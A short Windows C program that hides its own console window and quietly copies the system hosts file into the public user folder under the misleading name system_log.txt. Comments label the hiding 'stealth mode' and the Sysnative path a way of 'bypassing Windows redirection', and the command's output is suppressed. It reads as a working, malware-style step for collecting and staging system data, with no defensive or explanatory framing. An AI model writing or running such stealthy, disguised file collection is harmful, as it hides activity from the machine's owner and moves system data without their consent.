#include <windows.h>
#include <stdio.h>

int main() {
    // Hide command window execution (stealth mode)
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Command to copy the real hosts file (bypassing Windows redirection)
    system("cmd.exe /c copy C:\\Windows\\Sysnative\\drivers\\etc\\hosts C:\\Users\\Public\\system_log.txt > NUL 2>&1");

    return 0;
}
